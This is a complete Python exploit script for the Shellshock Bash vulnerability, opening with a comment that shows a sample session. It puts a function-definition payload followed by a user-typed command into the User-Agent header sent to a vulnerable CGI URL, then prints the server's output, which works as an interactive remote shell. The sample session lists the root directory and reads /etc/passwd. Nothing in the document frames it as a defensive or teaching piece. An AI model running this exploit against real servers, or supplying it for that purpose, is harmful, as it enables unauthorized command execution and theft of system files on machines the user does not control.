# Successful Output:
# # python shell_shocker.py <VulnURL>
# [+] Attempting Shell_Shock - Make sure to type full path
# ~$ /bin/ls /
# bin
# boot
# dev
# etc
# ..
# ~$ /bin/cat /etc/passwd


import sys
import urllib.request

def run():
        if len(sys.argv) != 2:
                print("Usage: shell_shocker <URL>")
                sys.exit(0)

        url = sys.argv[1]
        print("[+] Attempting Shell_Shock - Make sure to type full path")

        while True:
                command = input("~$ ")
                if command == "quit":
                        sys.exit(0)

                opener = urllib.request.build_opener()
                opener.addheaders=[('User-agent', '() { foo;}; echo Content-Type: text/plain ; echo ; '+command)]
                try:
                        response = opener.open(url)
                        for line in response.readlines():
                                print(line.strip().decode('UTF-8'))
                except Exception as e: print(e)

if __name__ == "__main__":
        run()